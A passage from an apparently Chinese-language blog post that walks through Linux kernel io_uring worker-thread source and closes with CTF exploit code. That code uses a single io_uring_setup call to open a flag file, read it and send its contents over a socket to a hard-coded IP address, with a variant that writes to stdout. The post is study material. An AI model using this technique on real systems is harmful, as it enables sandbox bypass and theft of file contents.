class="keyword">goto</span> fail;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">INIT_WORK(&amp;worker-&gt;work, io_workqueue_create);</span><br><span class="line">schedule_work(&amp;worker-&gt;work);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="io-wq-worker-内核任务线程"><code>io_wq_worker</code>  | 内核任务线程</h4><p>此线程就是线程池中worker的基本单元, 也是真正的异步io处理线程, 其通过自旋锁来阻塞进程, 直到有 work 需要完成.</p><p>中间一大段是和线程调度相关的代码, 包括设置信号处理之类的代码, 由于并不是当前分析的重点, 这里笔者就先跳过了.</p><p>最终, 是调用了 <code>io_worker_handle_work</code>  来处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_wq_worker</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_worker</span> *<span class="title">worker</span> =</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> io_wq_get_acct(worker);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq</span> *<span class="title">wq</span> =</span> worker-&gt;wq;</span><br><span class="line"><span class="type">bool</span> exit_mask = <span class="literal">false</span>, last_timeout = <span class="literal">false</span>;</span><br><span class="line"><span class="type">char</span> buf[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">worker-&gt;flags |= (IO_WORKER_F_UP | IO_WORKER_F_RUNNING);</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;iou-wrk-%d&quot;</span>, wq-&gt;task-&gt;pid);</span><br><span class="line">set_task_comm(current, buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state)) &#123;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (io_acct_run_queue(acct))</span><br><span class="line">io_worker_handle_work(acct, worker);</span><br><span class="line"><span class="comment">// 轮询  </span></span><br><span class="line"><span class="comment">// 如果存在需要完成的work </span></span><br><span class="line"><span class="comment">// io_acct_run_queue 就能持有 acct-&gt;lock 返回</span></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Last sleep timed out. Exit if we&#x27;re not the last worker,</span></span><br><span class="line"><span class="comment"> * or if someone modified our affinity.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (last_timeout &amp;&amp; (exit_mask || acct-&gt;nr_workers &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">acct-&gt;nr_workers--;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">last_timeout = <span class="literal">false</span>;</span><br><span class="line">__io_worker_idle(wq, worker);</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (io_run_task_work())</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">ret = schedule_timeout(WORKER_IDLE_TIMEOUT);</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ksignal</span> <span class="title">ksig</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!get_signal(&amp;ksig))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">last_timeout = <span class="literal">true</span>;</span><br><span class="line">exit_mask = !cpumask_test_cpu(raw_smp_processor_id(),</span><br><span class="line">wq-&gt;cpu_mask);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) &amp;&amp; io_acct_run_queue(acct))</span><br><span class="line">io_worker_handle_work(acct, worker);</span><br><span class="line"><span class="comment">// worker handle 必须持有 acct-&gt;lock </span></span><br><span class="line"></span><br><span class="line">io_worker_exit(worker);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-worker-handle-work"><code>io_worker_handle_work</code></h4><p>这个函数必须持有 <code>acct-&gt;lock</code> 才能进入, 也是此函数真正开始处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_worker_handle_work</span><span class="params">(<span class="keyword">struct</span> io_wq_acct *acct,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> io_worker *worker)</span></span><br><span class="line">__<span class="title function_">releases</span><span class="params">(&amp;acct-&gt;lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq</span> *<span class="title">wq</span> =</span> worker-&gt;wq;</span><br><span class="line"><span class="type">bool</span> do_kill = test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work</span> *<span class="title">work</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we got some work, mark us as busy. If we didn&#x27;t, but</span></span><br><span class="line"><span class="comment"> * the list isn&#x27;t empty, it means we stalled on hashed work.</span></span><br><span class="line"><span class="comment"> * Mark us stalled so we don&#x27;t keep looking for work when we</span></span><br><span class="line"><span class="comment"> * can&#x27;t make progress, any work completion or insertion will</span></span><br><span class="line"><span class="comment"> * clear the stalled flag.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">work = io_get_next_work(acct, worker);</span><br><span class="line">raw_spin_unlock(&amp;acct-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (work) &#123;</span><br><span class="line">__io_worker_busy(wq, worker);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Make sure cancelation can find this, even before</span></span><br><span class="line"><span class="comment"> * it becomes the active work. That avoids a window</span></span><br><span class="line"><span class="comment"> * where the work has been removed from our general</span></span><br><span class="line"><span class="comment"> * work list, but isn&#x27;t yet discoverable as the</span></span><br><span class="line"><span class="comment"> * current work item for this worker.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">raw_spin_lock(&amp;worker-&gt;lock);</span><br><span class="line">worker-&gt;next_work = work;</span><br><span class="line">raw_spin_unlock(&amp;worker-&gt;lock);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">io_assign_current_work(worker, work);</span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理所有链起来的任务</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work</span> *<span class="title">next_hashed</span>, *<span class="title">linked</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hash = io_get_work_hash(work);</span><br><span class="line"></span><br><span class="line">next_hashed = wq_next_work(work);</span><br><span class="line"><span class="comment">// 获取下一个任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(do_kill) &amp;&amp; (work-&gt;flags &amp; IO_WQ_WORK_UNBOUND))</span><br><span class="line">work-&gt;flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line">wq-&gt;do_work(work);</span><br><span class="line"><span class="comment">// do_work 来处理任务</span></span><br><span class="line">io_assign_current_work(worker, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">linked = wq-&gt;free_work(work);</span><br><span class="line"><span class="comment">// 断链</span></span><br><span class="line">work = next_hashed;</span><br><span class="line"><span class="comment">// 将work改为下一个任务</span></span><br><span class="line"><span class="keyword">if</span> (!work &amp;&amp; linked &amp;&amp; !io_wq_is_hashed(linked)) &#123;</span><br><span class="line">work = linked;</span><br><span class="line">linked = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">io_assign_current_work(worker, work);</span><br><span class="line"><span class="keyword">if</span> (linked)</span><br><span class="line">io_wq_enqueue(wq, linked);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hash != <span class="number">-1U</span> &amp;&amp; !next_hashed) &#123;</span><br><span class="line"><span class="comment">/* serialize hash clear with wake_up() */</span></span><br><span class="line">spin_lock_irq(&amp;wq-&gt;hash-&gt;wait.lock);</span><br><span class="line">clear_bit(hash, &amp;wq-&gt;hash-&gt;<span class="built_in">map</span>);</span><br><span class="line">clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags);</span><br><span class="line">spin_unlock_irq(&amp;wq-&gt;hash-&gt;wait.lock);</span><br><span class="line"><span class="keyword">if</span> (wq_has_sleeper(&amp;wq-&gt;hash-&gt;wait))</span><br><span class="line">wake_up(&amp;wq-&gt;hash-&gt;wait);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (work);</span><br><span class="line"><span class="comment">// 不断循环执行, 直到链上清空</span></span><br><span class="line"><span class="keyword">if</span> (!__io_acct_run_queue(acct))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">raw_spin_lock(&amp;acct-&gt;lock);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这里调用了  <code>do_work</code>  来处理任务, <code>do_work</code> 实际指向的是 <code>io_wq_submit_work</code>, 最终还是调用了 <code>io_issue_queue</code>  来处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_wq_submit_work</span><span class="params">(<span class="keyword">struct</span> io_wq_work *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">req</span> =</span> container_of(work, <span class="keyword">struct</span> io_kiocb, work);</span><br><span class="line"><span class="comment">// 通过 work 结构体 直接根据偏移计算拿到 req 的指针</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> *<span class="title">def</span> =</span> &amp;io_issue_defs[req-&gt;opcode];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> issue_flags = IO_URING_F_UNLOCKED | IO_URING_F_IOWQ;</span><br><span class="line"><span class="type">bool</span> needs_poll = <span class="literal">false</span>;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>, err = -ECANCELED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* one will be dropped by -&gt;io_wq_free_work() after returning to io-wq */</span></span><br><span class="line"><span class="keyword">if</span> (!(req-&gt;flags &amp; REQ_F_REFCOUNT))</span><br><span class="line">__io_req_set_refcount(req, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">req_ref_get(req);</span><br><span class="line"></span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* either cancelled or io-wq is dying, so don&#x27;t touch tctx-&gt;iowq */</span></span><br><span class="line"><span class="keyword">if</span> (work-&gt;flags &amp; IO_WQ_WORK_CANCEL) &#123;</span><br><span class="line">fail:</span><br><span class="line">io_req_task_queue_fail(req, err);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!io_assign_file(req, def, issue_flags)) &#123;</span><br><span class="line">err = -EBADF;</span><br><span class="line">work-&gt;flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; REQ_F_FORCE_ASYNC) &#123;</span><br><span class="line"><span class="type">bool</span> opcode_poll = def-&gt;pollin || def-&gt;pollout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opcode_poll &amp;&amp; file_can_poll(req-&gt;file)) &#123;</span><br><span class="line">needs_poll = <span class="literal">true</span>;</span><br><span class="line">issue_flags |= IO_URING_F_NONBLOCK;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">ret = io_issue_sqe(req, issue_flags);</span><br><span class="line"><span class="comment">// 最终还是调用了 io_issue_sqe 来处理任务</span></span><br><span class="line"><span class="keyword">if</span> (ret != -EAGAIN)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If REQ_F_NOWAIT is set, then don&#x27;t wait or retry with</span></span><br><span class="line"><span class="comment"> * poll. -EAGAIN is final for that case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; REQ_F_NOWAIT)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can get EAGAIN for iopolled IO even though we&#x27;re</span></span><br><span class="line"><span class="comment"> * forcing a sync submission from here, since we can&#x27;t</span></span><br><span class="line"><span class="comment"> * wait for request slots on the block side.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!needs_poll) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (io_wq_worker_stopped())</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (io_arm_poll_handler(req, issue_flags) == IO_APOLL_OK)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/* aborted or ready, in either case retry blocking */</span></span><br><span class="line">needs_poll = <span class="literal">false</span>;</span><br><span class="line">issue_flags &amp;= ~IO_URING_F_NONBLOCK;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* avoid locking problems by failing it from a clean context */</span></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">io_req_task_queue_fail(req, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="summary">summary</h2><p>笔者已经从上至下，透视了整个io_uring的实现//</p><p>当然，在这篇文章，笔者还留下了很多问题，比如linux kernel与同步和异步过程相关的实现， 由于笔者太菜了，对于kernel部分代码的分析也稍显吃力。</p><p>不过就这篇文章而言，在用户态io_uring的使用，笔者应该讲述得很清晰了。</p><p>最后，再让我们回到文章开始的问题：</p><p>如何只用一个 <code>io_uring_setup</code> 实现ORW?</p><p>在完全看完整篇文章后，大家应该也有答案了：</p><ul><li>设置 <code>IORING_SETUP_SQPOLL</code>  此时不再需要 <code>io_uring_submite</code> 提交</li><li>设置 <code>IORING_SETUP_NOMMAP</code>  此时不再需要之后mmap ring和sqe</li></ul><h2 id="TODO">TODO</h2><ul><li>ctx 初始化分析</li><li>线程调度分析</li><li>wq队列处理分析</li></ul><h2 id="exp">exp</h2><p>笔者在实际利用时发现, 在笔者的笔记本的qemu的环境里, 似乎是因为只有一个core, 如果控制权转移给了<code>io_sq_thread</code> 线程, 除非其主动转移控制权, 主进程基本会直接阻塞, 因此, open sq的处理实际要在 <code>io_uring_setup</code> 创建返回fd之前, 因此 flag文件的fd为3 才能稳定应用</p><p>通过Socket连接写回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">// mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_READ;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">3</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">1</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">    sqe[<span class="number">2</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">2</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">    sqe[<span class="number">3</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">5</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].flags = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = &amp;socket_add;</span><br><span class="line">    sqe[<span class="number">3</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">5</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>orw</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">3</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">1</span>].len = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sqe[4].flags = IOSQE_IO_HARDLINK;</span></span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">1</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">2</span>].len = <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><p>通过大量open避免 open的fd和 <code>io_uring_setup</code> 返回的fd竞争的问题<br>增强利用稳定性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 